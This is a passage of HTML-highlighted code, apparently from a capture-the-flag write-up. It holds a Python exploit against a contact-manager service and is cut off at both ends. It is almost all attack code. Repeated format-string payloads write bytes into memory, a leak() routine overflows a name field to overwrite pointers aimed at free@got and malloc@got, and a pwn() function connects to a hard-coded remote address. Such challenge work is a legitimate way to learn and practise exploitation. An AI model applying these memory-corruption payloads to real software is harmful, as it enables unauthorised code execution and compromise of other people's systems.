</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'><span class="c">#-----------</span>
</span><span class='line'><span class="c">#-----------</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">start</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%6$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'><span class="c"># readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'><span class="c">#-----------</span>
</span><span class='line'><span class="c">#-----------</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">start</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%6$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">x</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'><span class="c">#-----------</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">start</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%6$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">x</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># start writing bytes     </span>
</span><span class='line'><span class="c">#---write first byte</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%30$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change?&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt;&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">x</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">8</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%30$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">16</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%30$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">x</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span><span class="o">+</span><span class="s">&#39;c%18$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#readtil(&#39;&gt;&gt;&gt; &#39;)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;2&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1000&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;iption:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;%&#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">((</span><span class="n">i</span> <span class="o">&gt;&gt;</span> <span class="mi">24</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span> <span class="o">+</span> <span class="s">&#39;c%30$hhn&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>                  
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">leak</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">print</span> <span class="s">&quot;leaking &quot;</span> <span class="o">+</span> <span class="nb">hex</span><span class="p">(</span><span class="n">x</span><span class="p">)</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">last_addr</span>
</span><span class='line'>  <span class="c"># edit contact 1 -&gt; name to overflow pointers</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;3&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;change? &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">if</span> <span class="n">last_addr</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="k">else</span><span class="p">:</span>
</span><span class='line'>      <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mi">63</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;name:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#       name   len    valid   char *description==write1-&gt;free@got // char *phone==leak1-&gt;malloc@got  </span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;B&#39;</span><span class="o">*</span><span class="mi">63</span><span class="o">+</span><span class="s">&quot;</span><span class="se">\x00</span><span class="s">&quot;</span><span class="o">+</span><span class="s">&quot;BBBB&quot;</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="n">p</span><span class="p">(</span><span class="n">x</span><span class="p">)</span><span class="o">+</span><span class="s">&quot;BAR2&quot;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">last_addr</span> <span class="o">=</span> <span class="n">x</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;4&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">data</span> <span class="o">=</span> <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">m</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s">&#39;Phone #: (.*)&#39;</span><span class="p">,</span> <span class="n">data</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">m</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">leak4</span><span class="p">(</span><span class="n">x</span><span class="p">):</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">struct</span><span class="o">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">&#39;I&#39;</span><span class="p">,</span> <span class="n">leak</span><span class="p">(</span><span class="n">x</span><span class="p">)[</span><span class="mi">0</span><span class="p">:</span><span class="mi">4</span><span class="p">])[</span><span class="mi">0</span><span class="p">]</span>
</span><span class='line'>  
</span><span class='line'><span class="k">def</span> <span class="nf">pwn</span><span class="p">():</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">s</span>
</span><span class='line'>  <span class="k">global</span> <span class="n">last_addr</span>
</span><span class='line'>  <span class="n">last_addr</span> <span class="o">=</span> <span class="mi">0</span>
</span><span class='line'>  <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>  <span class="c">#s.connect((&#39;127.0.0.1&#39;, 4444))</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;54.165.223.128&#39;</span><span class="p">,</span> <span class="mi">2555</span><span class="p">))</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># create contact 1</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Name: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BAR1&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;Phone No: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;0&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description: &#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;100&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;description:&#39;</span><span class="p">)</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;BLEH&#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="n">readtil</span><span class="p">(</span><span class="s">&#39;&gt;&gt;&gt; &#39;</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># create contact 2</span>
</span><span class='line'>  <span class="n">sendln</span><span class="p">(</span><span class="s">&#39;1&#39;</span><span class="p">)</span>
